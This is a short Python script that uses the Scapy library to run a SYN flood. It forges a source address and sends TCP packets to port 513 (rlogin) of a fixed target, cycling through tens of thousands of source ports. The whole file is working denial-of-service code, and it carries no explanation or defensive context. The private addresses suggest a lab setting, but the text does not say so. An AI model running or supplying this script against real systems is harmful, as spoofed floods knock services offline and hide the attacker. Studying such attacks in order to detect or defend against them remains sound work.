from scapy.all import *
from scapy.layers.inet import IP, TCP


def synflood(src, tgt):
    for sport in range(1024, 65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)

src = "10.1.1.2"
tgt = "192.168.1.5"
synflood(src,tgt)